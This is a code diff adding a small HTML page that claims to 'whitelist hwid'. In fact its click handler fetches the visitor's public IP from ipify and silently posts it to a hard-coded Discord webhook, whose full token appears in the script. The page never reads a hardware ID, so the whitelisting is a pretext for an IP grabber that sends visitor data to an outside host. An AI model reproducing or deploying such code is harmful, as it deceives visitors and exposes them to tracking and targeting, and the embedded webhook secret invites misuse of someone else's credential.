@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>whitelist</title>
+</head>
+<body>
+    <button id="whitelistButton">whitelist hwid</button>
+    <p id="status"></p>
+
+    <script>
+        document.getElementById('whitelistButton').addEventListener('click', function() {
+            document.getElementById('status').textContent = 'gg';
+
+            // Fetch the user's IP from ipify
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const userIp = data.ip;
+
+                    // Discord webhook URL
+                    const webhookUrl = 'https://discord.com/api/webhooks/1344853223265144862/ki4fIrysGL9w9yukpHh1d5_O7LpYwnroSE9BQb6EkSGv9ABHwZqcprPoyLioV5ATST87';
+
+                    // Prepare the payload
+                    const payload = {
+                        content: `New IP whitelisted: ${userIp}`,
+                        username: "IP Whitelist Bot"
+                    };
+
+                    // Send the IP to the Discord webhook
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('IP sent to Discord:', data);
+                    })
+                    .catch(error => {
+                        console.error('Error sending IP to Discord:', error);
+                    });
+                })
+                .catch(error => {
+                    console.error('Error fetching IP:', error);
+                });
+        });
+    </script>
+</body>
+</html>
